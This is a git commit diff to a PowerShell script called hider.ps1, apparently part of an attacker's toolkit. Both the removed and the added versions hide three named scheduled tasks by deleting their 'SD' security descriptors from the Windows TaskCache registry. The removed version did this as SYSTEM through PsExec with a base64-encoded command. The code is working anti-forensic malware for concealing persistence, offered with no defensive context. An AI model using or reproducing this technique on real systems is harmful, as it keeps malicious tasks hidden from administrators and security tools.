f78a0ecac37c331135930e00ac5a00428ce77729
merhabasii <merhabasi@tutamail.com>
2026-05-20 04:30:03 +0300

    Update hider.ps1

--- hider.ps1
+++ hider.ps1
@@ -1,17 +1,13 @@
-$PsExecPath = Join-Path $env:TEMP "PsExec64.exe"
-
 $TaskNames = @(
     "upgradef1",
     "TempVBS2",
     "WinCheck"
 )
 
-if (Test-Path $PsExecPath) {
-    foreach ($TaskName in $TaskNames) {
-        $Command = "Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$TaskName' -Name 'SD'"
-        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
-        $EncodedCommand = [Convert]::ToBase64String($Bytes)
-        
-        & $PsExecPath /accepteula -s powershell.exe -EncodedCommand $EncodedCommand
+foreach ($TaskName in $TaskNames) {
+    $RegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$TaskName"
+    
+    if (Test-Path $RegistryPath) {
+        Remove-ItemProperty -Path $RegistryPath -Name "SD" -ErrorAction SilentlyContinue
     }
 }
